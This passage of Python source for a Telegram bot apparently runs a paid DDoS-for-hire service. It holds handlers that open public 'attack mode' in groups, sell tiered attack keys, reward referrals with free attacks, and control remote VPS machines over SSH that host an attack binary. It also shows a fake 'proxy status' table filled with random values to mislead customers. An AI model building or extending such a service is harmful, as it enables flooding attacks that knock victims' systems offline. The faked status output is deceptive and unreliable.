        if 0 <= idx < len(ALLOWED_GROUP_IDS):
            removed_group = ALLOWED_GROUP_IDS.pop(idx)
            bot.reply_to(message, f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗚𝗿𝗼𝘂𝗽 𝗜𝗗 `{removed_group}`", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗵𝗼𝗶𝗰𝗲!")
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "🌐 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾")
def activate_public(message):
    """Activate public attack mode for a group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲!")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        if group_id in PUBLIC_GROUPS:  # Skip already public groups
            continue
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🌐 {chat.title}"))
        except:
            continue
    
    if len(markup.keyboard) == 0:  # No groups available
        bot.reply_to(message, "⚠️ 𝗔𝗹𝗹 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗴𝗿𝗼𝘂𝗽𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗮𝗰𝘁𝗶𝘃𝗲!", reply_markup=create_main_keyboard(message))
        return
    
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    bot.reply_to(message, "🛠️ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 (𝟭𝟮𝟬𝘀 𝗹𝗶𝗺𝗶𝘁, 𝟭 𝗩𝗣𝗦):", reply_markup=markup)
    bot.register_next_step_handler(message, process_public_group_selection)

def process_public_group_selection(message):
    """Process group selection for public mode with premium styling"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "🚫 𝗣𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 🌐 prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        bot.reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return
    
    # Add the selected group to public groups list
    if selected_group not in PUBLIC_GROUPS:
        PUBLIC_GROUPS.append(selected_group)
    
    bot.reply_to(message, 
        f"""
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 〕━━━╮
┃
┣ 🔹 𝗚𝗿𝗼𝘂𝗽: {selected_title}
┣ ⏱ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
┣ 🧵 𝗠𝗮𝘁𝘁𝗮𝗰𝗸𝘀: 𝟭𝟬𝟬
┣ 🔓 𝗡𝗼 𝗸𝗲𝘆 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
""", 
        reply_markup=create_main_keyboard(message))
    
    # Send announcement to the selected group
    try:
        bot.send_message(
            selected_group,
            """
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 〕━━━╮
┃
┣ 🔥 𝗔𝗻𝘆𝗼𝗻𝗲 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!
┃
┣ ⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
┣ ⏱ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
┣ 🧵 𝗠𝗮𝘅 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 𝟭8𝟬𝟬
┣ 🔓 𝗡𝗼 𝗸𝗲𝘆 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱
┃
┣ 💡 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗮𝘀 𝘂𝘀𝘂𝗮𝗹!
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
        )
    except Exception as e:
        print(f"[ERROR] Could not send public mode announcement: {e}")

@bot.message_handler(func=lambda msg: msg.text == "❌ 𝘿𝙀𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾")
def deactivate_public_start(message):
    """Start deactivation of public attack mode with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ Only owner can deactivate public mode!")
        return

    if not PUBLIC_GROUPS:
        bot.reply_to(message, "ℹ️ Public mode is not active on any group.")
        return

    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"❌ {chat.title}"))
        except:
            markup.add(telebot.types.KeyboardButton(f"❌ Unknown Group ({group_id})"))

    markup.add(telebot.types.KeyboardButton("❌ Cancel"))

    bot.reply_to(message, "Select group(s) to deactivate public mode:", reply_markup=markup)
    bot.register_next_step_handler(message, process_deactivate_public_selection)

def process_deactivate_public_selection(message):
    """Process deactivation of public mode with premium styling"""
    if message.text == "❌ Cancel":
        bot.reply_to(message, "❌ Deactivation cancelled.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:]  # remove ❌ emoji

    # Find which group was selected
    selected_group = None
    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            if f"Unknown Group ({group_id})" == selected_title:
                selected_group = group_id
                break

    if selected_group:
        PUBLIC_GROUPS.remove(selected_group)
        try:
            bot.send_message(selected_group, "❌ PUBLIC ATTACK MODE HAS BEEN DEACTIVATED.")
        except:
            pass
        bot.reply_to(message, f"✅ Public mode deactivated for {selected_title}.", reply_markup=create_main_keyboard(message))
    else:
        bot.reply_to(message, "❌ Selected group not found in public groups list.", reply_markup=create_main_keyboard(message))
        
# ======================
# 👥 ADMIN MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉")
def start_add_admin(message):
    """Start admin addition process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡𝗦!")
        return
    bot.reply_to(message, "📝 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗸 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 (without @) 𝗼𝗳 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗮𝗱𝗱:")
    bot.register_next_step_handler(message, process_add_admin)

def process_add_admin(message):
    """Process admin addition with premium styling"""
    username = message.text.strip().lstrip("@")
    if username in ADMIN_IDS:
        bot.reply_to(message, f"⚠️ @{username} 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        return
    ADMIN_IDS.append(username)
    save_admins()
    bot.reply_to(message, f"✅ 𝗔𝗗𝗗𝗘𝗗: @{username} 𝗶𝘀 𝗻𝗼𝘄 𝗮𝗻 𝗔𝗗𝗠𝗜𝗡.")

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉")
def start_remove_admin(message):
    """Start admin removal process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡𝗦!")
        return
    bot.reply_to(message, "📝 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 (without @) 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:")
    bot.register_next_step_handler(message, process_remove_admin)

def process_remove_admin(message):
    """Process admin removal with premium styling"""
    username = message.text.strip().lstrip("@")
    if username not in ADMIN_IDS:
        bot.reply_to(message, f"❌ @{username} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝗹𝗶𝘀𝘁.")
        return
    ADMIN_IDS.remove(username)
    save_admins()
    bot.reply_to(message, f"🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘𝗗: @{username} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝗔𝗗𝗠𝗜𝗡𝗦.")    
    
@bot.message_handler(func=lambda msg: msg.text == "📋 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧")
def show_admin_list(message):
    """Show list of all admins with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝗹𝗶𝘀𝘁!")
        return

    if not ADMIN_IDS:
        bot.reply_to(message, "⚠️ 𝗡𝗼 𝗮𝗱𝗺𝗶𝗻𝘀 𝗳𝗼𝘂𝗻𝗱.")
        return

    admin_list = "\n".join([f"• @{username}" for username in ADMIN_IDS])
    bot.reply_to(message, f"📋 *𝗔𝗗𝗠𝗜𝗡𝗦 𝗟𝗜𝗦𝗧:*\n\n{admin_list}", parse_mode="Markdown")

# ======================
# 🎁 REFERRAL SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🎁 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟")
def generate_referral(message):
    """Generate referral link for user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Check if user already has a referral code
    if user_id in REFERRAL_CODES:
        code = REFERRAL_CODES[user_id]
    else:
        # Generate new referral code
        code = f"Alonepapa-{user_id[:4]}-{os.urandom(2).hex().upper()}"
        REFERRAL_CODES[user_id] = code
        save_data()
    
    # Create referral link
    referral_link = f"https://t.me/{bot.get_me().username}?start={code}"
    
    response = f"""
🌟 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗣𝗥𝗢𝗚𝗥𝗔𝗠 🌟

🔗 𝗬𝗼𝘂𝗿 𝗿𝗲𝗳𝗲𝗿𝗿𝗮𝗹 𝗹𝗶𝗻𝗸:
{referral_link}

𝗛𝗼𝘄 𝗶𝘁 𝘄𝗼𝗿𝗸𝘀:
1. Share this link with friends
2. When they join using your link
3. 𝗕𝗢𝗧𝗛 𝗼𝗳 𝘆𝗼𝘂 𝗴𝗲𝘁 𝗮 𝗳𝗿𝗲𝗲 {REFERRAL_REWARD_DURATION}𝘀 𝗮𝘁𝘁𝗮𝗰𝗸!
   (Valid for 10 minutes only)

💎 𝗧𝗵𝗲 𝗺𝗼𝗿𝗲 𝘆𝗼𝘂 𝘀𝗵𝗮𝗿𝗲, 𝘁𝗵𝗲 𝗺𝗼𝗿𝗲 𝘆𝗼𝘂 𝗲𝗮𝗿𝗻!
"""
    bot.reply_to(message, response)

def handle_referral(message, referral_code):
    """Process referral code usage with premium styling"""
    new_user_id = str(message.from_user.id)
    
    # Check if this user already exists in the system
    if new_user_id in redeemed_users or new_user_id in REFERRAL_LINKS:
        return  # Existing user, don't generate new keys
    
    # Check if this is a valid referral code
    referrer_id = None
    for uid, code in REFERRAL_CODES.items():
        if code == referral_code:
            referrer_id = uid
            break
    
    if referrer_id:
        # Store that this new user came from this referrer
        REFERRAL_LINKS[new_user_id] = referrer_id
        
        # Generate free attack keys for both users (valid for 10 minutes)
        expiry_time = time.time() + 600  # 10 minutes in seconds
        
        # For referrer
        referrer_key = f"REF-{referrer_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[referrer_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        # For new user
        new_user_key = f"REF-{new_user_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[new_user_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        save_data()
        
        # Notify both users
        try:
            # Message to referrer
            bot.send_message(
                referrer_id,
                f"🎉 𝗡𝗘𝗪 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟!\n"
                f"👤 {get_display_name(message.from_user)} used your referral link\n"
                f"🔑 𝗬𝗼𝘂𝗿 𝗿𝗲𝘄𝗮𝗿𝗱 𝗸𝗲𝘆: {referrer_key}\n"
                f"⏱ {REFERRAL_REWARD_DURATION}𝘀 𝗳𝗿𝗲𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 (Valid for 10 minutes)"
            )
            
            # Message to new user
            bot.send_message(
                message.chat.id,
                f"🎁 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗕𝗢𝗡𝗨𝗦!\n"
                f"🔑 𝗬𝗼𝘂𝗿 𝗿𝗲𝘄𝗮𝗿𝗱 𝗸𝗲𝘆: {new_user_key}\n"
                f"⏱ {REFERRAL_REWARD_DURATION}𝘀 𝗳𝗿𝗲𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 (Valid for 10 minutes)\n\n"
                f"𝗨𝘀𝗲 redeem key button to redeem your key!"
            )
        except Exception as e:
            print(f"Error sending referral notifications: {e}")

# ======================
# 🍅 PROXY STATUS (STYLISH VERSION)
# ======================
def get_proxy_status():
    """Generate proxy status report in a formatted box with premium styling"""

    countries = [
        ("United States", "🇺🇸"), ("Germany", "🇩🇪"), ("Japan", "🇯🇵"),
        ("Singapore", "🇸🇬"), ("Netherlands", "🇳🇱"), ("France", "🇫🇷"),
        ("United Kingdom", "🇬🇧"), ("Canada", "🇨🇦"), ("Russia", "🇷🇺"),
        ("Brazil", "🇧🇷"), ("India", "🇮🇳"), ("Australia", "🇦🇺"),
        ("South Korea", "🇰🇷"), ("Sweden", "🇸🇪"), ("Switzerland", "🇨🇭"),
        ("Italy", "🇮🇹"), ("Spain", "🇪🇸"), ("Norway", "🇳🇴"),
        ("Mexico", "🇲🇽"), ("South Africa", "🇿🇦"), ("Poland", "🇵🇱"),
        ("Turkey", "🇹🇷"), ("Argentina", "🇦🇷"), ("Thailand", "🇹🇭"),
        ("Ukraine", "🇺🇦"), ("Malaysia", "🇲🇾"), ("Indonesia", "🇮🇩"),
        ("Philippines", "🇵🇭"), ("Vietnam", "🇻🇳"), ("Saudi Arabia", "🇸🇦")
    ]
    
    # Randomly select 6 to 8 countries
    selected_countries = random.sample(countries, random.randint(6, 8))
    
    rows = []
    for country, flag in selected_countries:
        if random.random() < 0.6:
            ping = random.randint(5, 50)
            status = "✅ ACTIVE"
            ping_display = f"{ping} ms"
        else:
            status = "❌ BUSY"
            ping_display = "--"
        rows.append((f"{flag} {country}", status, ping_display))

    # Column widths
    col1_width = 19
    col2_width = 11
    col3_width = 8

    def format_row(row):
        return f"| {row[0]:<{col1_width}}| {row[1]:<{col2_width}}| {row[2]:<{col3_width}}|"

    border = f"+{'-' * (col1_width + 1)}+{'-' * (col2_width + 1)}+{'-' * (col3_width + 1)}+"

    # Build the table
    table = [border]
    table.append(format_row(["Country", "Status", "Ping"]))
    table.append(border)

    for row in rows:
        table.append(format_row(row))
        table.append("")  # Empty line between rows

    table.append(border)
    table.append("")
    table.append("✅ ACTIVE - Available")
    table.append("❌ BUSY  - Proxy overloaded")
    table.append(f"\n 🚀 Total: {len(rows)} proxies, {sum(1 for row in rows if 'ACTIVE' in row[1])} available")

    return "\n".join(table)

@bot.message_handler(func=lambda msg: msg.text == "🍅 𝙋𝙍𝙊𝙓𝙔 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_proxy_status(message):
    """Show proxy status with loading animation and premium styling"""
    # Send processing message
    processing_msg = bot.send_message(message.chat.id, "🔍 Scanning global proxy network...")
    
    # Create loading animation
    dots = ["", ".", "..", "..."]
    for i in range(4):
        try:
            bot.edit_message_text(
                f"🔍 Scanning global proxy network{dots[i]}",
                message.chat.id,
                processing_msg.message_id
            )
            time.sleep(0.5)
        except:
            pass
    
    # Wait total 2 seconds
    time.sleep(0.5)  # Additional delay after animation
    
    # Get and send the status report
    status_report = get_proxy_status()
    
    try:
        bot.edit_message_text(
            status_report,
            message.chat.id,
            processing_msg.message_id
        )
    except:
        bot.send_message(message.chat.id, status_report)
        
# Add this handler to your bot (place it with other message handlers)
@bot.message_handler(func=lambda msg: msg.text == "🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆")
def stop_user_attack(message):
    """Stop all running attacks for the current user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Find all running attacks by this user
    user_attacks = [aid for aid, details in running_attacks.items() if details['user_id'] == user_id]
    
    if not user_attacks:
        bot.reply_to(message, "⚠️ 𝗡𝗼 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝘀𝘁𝗼𝗽.")
        return
    
    # Try to stop each attack
    stopped_count = 0
    for attack_id in user_attacks:
        attack_details = running_attacks.get(attack_id)
        if attack_details:
            try:
                # Get VPS details
                vps_ip = attack_details['vps_ip']
                vps = next((v for v in VPS_LIST if v[0] == vps_ip), None)
                
                if vps:
                    ip, username, password = vps
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=10)
                    
                    # Kill the attack process
                    ssh.exec_command(f"pkill -f {BINARY_NAME}")
                    ssh.close()
                    stopped_count += 1
            except Exception as e:
                print(f"Error stopping attack: {e}")
            finally:
                # Remove from running attacks
                running_attacks.pop(attack_id, None)
    
    if stopped_count > 0:
        bot.reply_to(message, f"✅ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱 {stopped_count} 𝗮𝘁𝘁𝗮𝗰𝗸{'𝘀' if stopped_count > 1 else ''}!")
    else:
        bot.reply_to(message, "⚠️ 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝘀𝘁𝗼𝗽 𝗮𝗻𝘆 𝗮𝘁𝘁𝗮𝗰𝗸𝘀.")

# Add this function in the HELPER FUNCTIONS section
def get_vps_health(ip, username, password):
    """Get VPS health with raw metrics and percentage"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        
        health_data = {
            'cpu': None,
            'memory': None,
            'disk': None,
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }
        
        # 1. Check CPU usage
        stdin, stdout, stderr = ssh.exec_command("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'")
        cpu_usage = float(stdout.read().decode().strip())
        health_data['cpu'] = f"{cpu_usage:.1f}%"
        
        # 2. Check memory usage
        stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f\", $3*100/$2 }'")
        mem_usage = float(stdout.read().decode().strip())
        health_data['memory'] = f"{mem_usage:.1f}%"
        
        # 3. Check disk usage
        stdin, stdout, stderr = ssh.exec_command("df -h | awk '$NF==\"/\"{printf \"%s\", $5}'")
        disk_usage = stdout.read().decode().strip()
        health_data['disk'] = disk_usage
        
        # 4. Check binary exists
        stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/freeroot/root/{BINARY_NAME} 2>/dev/null || echo 'Not found'")
        binary_exists = "Not found" not in stdout.read().decode()
        health_data['binary_exists'] = binary_exists
        
        # 5. Check binary executable
        stdin, stdout, stderr = ssh.exec_command(f"test -x /home/master/freeroot/root/{BINARY_NAME} && echo 'Executable' || echo 'Not executable'")
        binary_executable = "Executable" in stdout.read().decode()
        health_data['binary_executable'] = binary_executable
        
        # 6. Check network connectivity
        stdin, stdout, stderr = ssh.exec_command("ping -c 1 google.com >/dev/null 2>&1 && echo 'Online' || echo 'Offline'")
        network_ok = "Online" in stdout.read().decode()
        health_data['network'] = network_ok
        
        ssh.close()
        
        # Calculate health percentage
        health_score = 0
        max_score = 6  # Total possible points
        
        if cpu_usage < 80: health_score += 1
        if mem_usage < 80: health_score += 1
        if int(disk_usage.strip('%')) < 80: health_score += 1
        if binary_exists: health_score += 1
        if binary_executable: health_score += 1
        if network_ok: health_score += 1
        
        health_data['health_percent'] = int((health_score / max_score) * 100)
        
        return health_data
        
    except Exception as e:
        print(f"Error checking VPS health for {ip}: {e}")
        return {
            'cpu': "Error",
            'memory': "Error",
            'disk': "Error",
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }

# Update the handler to show raw metrics
@bot.message_handler(func=lambda msg: msg.text == "🏥 𝙑𝙋𝙎 𝙃𝙀𝘼𝙇𝙏𝙃")
def check_vps_health(message):
    if not is_owner(message.from_user):
        return
    
    status_messages = []
    for vps in VPS_LIST:
        stats = check_vps_load(vps[0], vps[1], vps[2])
        if stats:
            status = "✅ Good" if stats['load'] < 1.5 and stats['memory'] < 70 else "⚠️ Warning" if stats['load'] < 3 else "❌ Critical"
            status_messages.append(
                f"🔹 {vps[0]}\n"
                f"├ Load: {stats['load']}\n"
                f"├ Memory: {stats['memory']}%\n"
                f"└ Status: {status}\n"
            )
    
    bot.reply_to(message, "🖥️ VPS Health Status:\n\n" + "\n".join(status_messages))
            
@bot.message_handler(func=lambda msg: msg.text == "⚙️ 𝙏𝙃𝙍𝙀𝘼𝘿 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎")
def thread_settings_menu(message):
    """Handle thread settings menu access"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only owner can access thread settings!")
        return
    bot.send_message(
        message.chat.id,
        "⚙️ Thread Settings Management Panel",
        reply_markup=create_thread_settings_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "🧵 SET NORMAL THREADS")
def set_normal_threads(message):
    """Ask admin for new max thread count for normal users"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only the owner can set normal thread count!")
        return
    
    bot.reply_to(message, "🧵 Please enter the new MAX THREADS for normal users:")
    bot.register_next_step_handler(message, process_normal_threads)

def process_normal_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 5000:
            raise ValueError("Thread count out of range.")
        global MAX_THREADS
        MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"✅ Normal MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "❌ Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "⚡ SET SPECIAL THREADS")
def set_special_threads(message):
    """Ask admin for new max thread count for special keys"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only the owner can set special thread count!")
        return

    bot.reply_to(message, "⚡ Enter new MAX THREADS for SPECIAL key users:")
    bot.register_next_step_handler(message, process_special_threads)

def process_special_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 5000:
            raise ValueError("Thread count out of range.")
        global SPECIAL_MAX_THREADS
        SPECIAL_MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"✅ Special MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "❌ Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "💎 SET VIP THREADS")
def set_vip_threads(message):
    """Ask admin for new max thread count for VIP users"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only the owner can set VIP thread count!")
        return

    bot.reply_to(message, "💎 Enter new MAX THREADS for VIP users:")
    bot.register_next_step_handler(message, process_vip_threads)

def process_vip_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 10000:
            raise ValueError("Thread count out of safe range.")
        global VIP_MAX_THREADS
        VIP_MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"✅ VIP MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "❌ Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "📊 VIEW THREAD SETTINGS")
def view_thread_settings(message):
    """Show current thread settings"""
    response = f"""
⚙️ *Current Thread Settings*:

• 🧵 Normal Threads: `{MAX_THREADS}`
• ⚡ Special Threads: `{SPECIAL_MAX_THREADS}` 
• 💎 VIP Threads: `{VIP_MAX_THREADS}`

*Attack Durations:*
• Normal: `{MAX_DURATION}s`
• Special: `{SPECIAL_MAX_DURATION}s`
• VIP: `{VIP_MAX_DURATION}s`
"""
    bot.reply_to(message, response, parse_mode="Markdown")            


# ======================
# 👥 USER MANAGEMENT (STYLISH VERSION)
# ======================

@bot.message_handler(func=lambda msg: msg.text == "😅 𝗔𝗟𝗟 𝙐𝙎𝙀𝙍𝙎")
def show_all_users_handler(message):
    """Show list of all users who interacted with the bot"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only owner can view user list!")
        return
    
    if not all_users:
        bot.reply_to(message, "⚠️ No users found in database!")
        return
    
    # Sort users by last active time (newest first)
    sorted_users = sorted(all_users.items(), key=lambda x: x[1]['last_active'], reverse=True)
    
    user_list = []
    for user_id, user_data in sorted_users:
        username = f"@{user_data['username']}" if user_data['username'] else user_data['first_name']
        status = "✅ Active" if user_id in redeemed_users else "🚫 Not Active"
        last_seen = datetime.datetime.fromtimestamp(user_data['last_active']).strftime('%Y-%m-%d %H:%M')
        
        user_list.append(
            f"• {username} - {status}\n"
            f"  ├ ID: `{user_id}`\n"
            f"  └ Last Seen: {last_seen}\n"
        )
    
    # Split into chunks of 10 users to avoid message limits
    chunk_size = 10
    user_chunks = [user_list[i:i + chunk_size] for i in range(0, len(user_list), chunk_size)]
    
    for i, chunk in enumerate(user_chunks):
        header = f"📊 ALL USERS (Page {i+1}/{len(user_chunks)})\n\n"
        bot.send_message(
            message.chat.id,
            header + "\n".join(chunk),
            parse_mode="Markdown"
        )
        time.sleep(0.5)

@bot.message_handler(func=lambda msg: msg.text == "🔨 𝘽𝘼𝙉 𝙐𝙎𝙀𝙍")
def ban_user_start(message):
    """Start user ban process"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only owner can ban users!")
        return
    
    bot.reply_to(message, "⚠️ Enter username (with @) or user ID to ban:")
    bot.register_next_step_handler(message, process_ban_user)

def process_ban_user(message):
    """Process user ban"""
    identifier = message.text.strip()
    
    # Find user by ID or username
    banned_user = None
    for user_id, user_data in all_users.items():
        if (identifier == user_id or 
            (user_data['username'] and identifier == f"@{user_data['username']}")):
            banned_user = user_id
            break
    
    if not banned_user:
        bot.reply_to(message, "❌ User not found!")
        return
    
    # Add to banned users list (create if doesn't exist)
    if 'banned_users' not in globals():
        global banned_users
        banned_users = {}
    
    banned_users[banned_user] = {
        'banned_by': str(message.from_user.id),
        'timestamp': time.time(),
        'reason': "Manual ban by owner"
    }
    
    # Remove from redeemed users if exists
    if banned_user in redeemed_users:
        del redeemed_users[banned_user]
    
    save_data()
    
    bot.reply_to(message, 
        f"✅ User banned successfully!\n"
        f"ID: `{banned_user}`\n"
        f"Username: @{all_users[banned_user].get('username', 'N/A')}")

# Add this to your is_authorized_user function to check bans
def is_authorized_user(user):
    user_id = str(user.id)
    if 'banned_users' in globals() and user_id in banned_users:
        return False
    return str(user.id) in redeemed_users or is_admin(user)

# Add this to your save_data function
# ======================
# 🔓 USER UNBAN FUNCTIONALITY
# ======================

@bot.message_handler(func=lambda msg: msg.text == "🔓 𝙐𝙉𝘽𝘼𝙉 𝙐𝙎𝙀𝙍")
def unban_user_start(message):
    """Start user unban process with premium styling"""
    if not is_owner(message.from_user):
